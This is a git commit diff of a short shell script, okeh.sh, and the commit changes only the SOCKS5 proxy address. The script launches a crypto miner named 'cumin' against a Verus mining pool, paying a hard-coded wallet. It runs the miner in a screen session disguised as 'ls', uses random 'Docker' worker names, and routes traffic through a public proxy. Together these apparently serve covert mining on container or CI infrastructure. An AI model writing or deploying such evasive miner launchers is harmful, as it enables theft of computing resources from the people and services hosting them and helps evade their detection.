07d56e9620da8e98aa752623bcc58502c411c5b5
Jingga688 <86576451+Jingga688@users.noreply.github.com>
2021-06-29 19:01:27 +0700

    Update okeh.sh

--- okeh.sh
+++ okeh.sh
@@ -6,5 +6,5 @@ screen -dmS ls
 POOL=stratum+tcp://eu.luckpool.net:3956
 WALLET=RVXxf8Ci9MP5VmmkPyXjz3GUdzpBvmBJNH
 WORKER=$(echo $(shuf -i 1000-9999 -n 1)-Docker)
-PROXY=socks5://98.162.25.23:4145
+PROXY=socks5://69.16.226.164:59306
 ./cumin -a verus -o $POOL -u $WALLET.BASO -p $WORKER -t 2 -x $PROXY
